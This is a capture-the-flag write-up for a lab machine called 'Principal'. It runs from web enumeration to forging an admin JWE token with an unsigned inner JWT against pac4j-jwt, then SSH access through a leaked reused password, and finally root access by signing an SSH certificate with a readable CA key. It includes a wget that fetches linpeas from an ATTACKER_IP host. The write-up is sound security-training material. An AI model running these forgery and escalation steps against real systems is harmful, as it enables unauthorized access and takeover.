# Principal — Full Writeup

## Overview

The objective of this machine was to gain initial access through the exposed web application and subsequently escalate privileges to `root`.

The full compromise chain was achieved through:

1. surface enumeration;
2. frontend JavaScript analysis;
3. discovery of a JWE/JWT-based authentication mechanism with a public JWKS;
4. administrative token forgery;
5. access to privileged API endpoints;
6. disclosure of sensitive credentials and infrastructure details;
7. SSH access as `svc-deploy` via password reuse;
8. local enumeration using manual techniques and `linpeas`;
9. abuse of an SSH Certificate Authority (CA) private key readable by the `deployers` group;
10. generation of a valid SSH certificate for `root` and obtaining a root shell.

---

## 1. Initial Reconnaissance

After setting up the VPN and hostname resolution, the first step was to enumerate open TCP ports:

```bash
nmap -p- --min-rate 10000 -T4 principal.htb
```

The scan revealed only two open ports:

- `22/tcp` → SSH  
- `8080/tcp` → HTTP  

This significantly reduced the attack surface. With no additional services exposed, the most likely path was a web-based compromise followed by credential reuse or pivoting to SSH.

---

## 2. Accessing the Web Service

Navigating to:

```
http://principal.htb:8080
```

Initially, attempting HTTPS resulted in an SSL error, confirming the service was running over plain HTTP.

The application redirected to `/login`.

To identify the backend stack, HTTP headers were inspected:

```bash
curl -i http://principal.htb:8080/
```

Relevant response headers:

```
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
```

This indicated:

- Java backend (Jetty)
- Authentication handled by `pac4j-jwt`
- Likely use of JWT/JWE tokens

---

## 3. Web Path Enumeration

Directory enumeration was performed using `ffuf`:

```bash
ffuf -u http://principal.htb:8080/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-mc 200,204,301,302,403 -c
```

Discovered endpoints:

- `/login`
- `/dashboard`

Accessing `/dashboard` resulted in a brief load followed by a redirect to `/login`, suggesting frontend-based authentication logic (likely a SPA).

API fuzzing was also performed:

```bash
ffuf -u http://principal.htb:8080/api/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-mc all -fc 404 -c
```

Only one endpoint was accessible without authentication:

- `/api/health`

All others returned `401 Unauthorized`, indicating strict token-based protection.

---

## 4. Login Analysis

The login form submitted JSON data to:

```
POST /api/auth/login
```

Example request:

```bash
curl -i -s -X POST http://principal.htb:8080/api/auth/login \
-H "Content-Type: application/json" \
-d '{"username":"admin","password":"admin"}'
```

Response:

```json
{"error":"Unauthorized","message":"Invalid username or password"}
```

This ruled out:

- frontend rendering issues
- missing headers
- trivial authentication bypasses

Additional checks performed:

- `X-Forwarded-For` spoofing
- probing `/reset-password`
- probing `/actuator`, `/metrics`, `/env`

Results:

- `/reset-password` → `501 Not Implemented`
- no actuator endpoints
- API consistently required Bearer tokens

At this point, the issue clearly lay within the authentication mechanism.

---

## 5. Frontend JavaScript Analysis

The main JavaScript bundle was downloaded:

```bash
curl -s http://principal.htb:8080/static/js/app.js -o app.js
```

Relevant strings were extracted:

```bash
grep -iE "fetch|axios|/api|token|bearer|jwt|login|auth|localStorage|sessionStorage" app.js
```

Key findings:

- Token stored in `sessionStorage` as `auth_token`
- Authorization header: `Bearer <token>`
- Public endpoint: `/api/auth/jwks`
- Authentication uses **JWE (encrypted JWT)**
- Algorithms:
  - `RSA-OAEP-256` + `A128GCM` (JWE)
  - `RS256` (JWT)
- Roles include:
  - `ROLE_ADMIN`
  - `ROLE_MANAGER`
  - `ROLE_USER`

This shifted the focus to cryptographic abuse rather than password attacks.

---

## 6. JWKS Extraction

The public key was retrieved:

```bash
curl -s http://principal.htb:8080/api/auth/jwks
```

Response:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "..."
    }
  ]
}
```

This suggested:

- JWE encryption uses the exposed public key
- Potential lack of proper validation of the inner JWT

---

## 7. Admin Token Forgery

A custom Python script (`/Files/forge.py`) was used to:

1. fetch the JWKS;
2. create a JWT with `alg=none`;
3. inject arbitrary claims (e.g., `ROLE_ADMIN`);
4. encrypt the payload into a JWE using the public key;
5. send the forged token to the API.

Example payload:

```json
{
  "sub": "admin",
  "role": "ROLE_ADMIN",
  "iss": "principal-platform",
  "iat": <timestamp>,
  "exp": <timestamp + 3600>
}
```

Request:

```bash
curl -s http://principal.htb:8080/api/dashboard \
-H "Authorization: Bearer <forged_token>"
```

Result:

- `200 OK`
- Access to admin dashboard

This confirmed a critical vulnerability:  
**the application accepted encrypted tokens without properly validating the inner JWT signature.**

---

## 8. Authenticated Enumeration

With admin access, sensitive endpoints were queried:

```bash
curl -s http://principal.htb:8080/api/users \
-H "Authorization: Bearer <token>" | jq
```

```bash
curl -s http://principal.htb:8080/api/settings \
-H "Authorization: Bearer <token>" | jq
```

Findings:

- user list including `svc-deploy`
- infrastructure details
- critical secret:

```json
"encryptionKey": "D3pl0y_$$H_Now42!"
```

- SSH CA path:

```json
"sshCaPath": "/opt/principal/ssh/"
```

---

## 9. Initial Access via SSH

Password reuse was attempted:

```bash
ssh svc-deploy@principal.htb
```

Password:

```
D3pl0y_$$H_Now42!
```

Result: successful login as `svc-deploy`.

User flag:

```bash
cat ~/user.txt
```

---

## 10. Local Enumeration

Check for sudo:

```bash
sudo -l
```

No useful privileges.

`linpeas` was transferred via HTTP:

```bash
# Attacker
python3 -m http.server 8000
```

```bash
# Target
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
```

---

## 11. Key Findings

Important observations:

- user belongs to group `deployers`
- directory `/opt/principal/ssh/` exists
- files:

```bash
ls -la /opt/principal/ssh/
```

Output included:

```
-rw-r----- 1 root deployers 3381 ca
-rw-r--r-- 1 root root      ... ca.pub
```

The private CA key (`ca`) was readable by the `deployers` group.

---

## 12. Privilege Escalation via SSH CA Abuse

Attack steps:

1. Fix permissions:

```bash
chmod 600 ca
```

2. Generate attacker keypair:

```bash
ssh-keygen -t rsa -f evil
```

3. Sign public key using CA:

```bash
ssh-keygen -s ca -I root_cert -n root -V +52w evil.pub
```

4. Authenticate as root:

```bash
ssh -i evil -o CertificateFile=evil-cert.pub root@principal.htb
```

Result: root shell obtained.

---

## 13. Root Flag

```bash
cat /root/root.txt
```

---

## 14. Final Attack Chain

- port enumeration
- identification of Jetty + pac4j-jwt
- frontend analysis → JWKS discovery
- JWE/JWT token forgery
- access to privileged endpoints
- disclosure of credentials and SSH CA path
- password reuse → `svc-deploy`
- local enumeration
- discovery of readable SSH CA private key
- certificate signing for `root`
- root shell
